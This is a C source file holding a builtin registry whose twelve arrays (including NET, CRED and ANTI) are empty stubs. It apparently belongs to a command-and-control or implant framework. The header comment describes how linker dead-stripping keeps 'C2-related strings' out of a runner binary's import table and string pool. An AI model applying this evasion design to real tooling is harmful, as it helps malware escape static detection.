/* ──────────────────────────────────────────────────────────────────────
 * Compile-time registry of all builtins.
 *
 * Each BUILTINS_* array is defined in its own translation unit. The linker
 * only pulls in an object file when a symbol from that file is referenced
 * somewhere else in the binary.
 *
 * In the runner build, only the minimal tables below are referenced from
 * builtins_call(), so the heavy builtins (net, kernel, process, anti, ...)
 * are dropped from the runner binary and their C2-related strings never
 * appear in its import table or string pool.
 * ────────────────────────────────────────────────────────────────────── */

#include "jky_builtins.h"

const Builtin BUILTINS_PURE[]   = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_SYSTEM[] = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_FS[]     = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_DATA[]   = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_CRYPTO[] = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_KERNEL[] = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_PROCESS[]= { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_MEMORY[] = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_NET[]    = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_CRED[]   = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_ANTI[]   = { { NULL, 0, 0, NULL } };
const Builtin BUILTINS_UTIL[]   = { { NULL, 0, 0, NULL } };
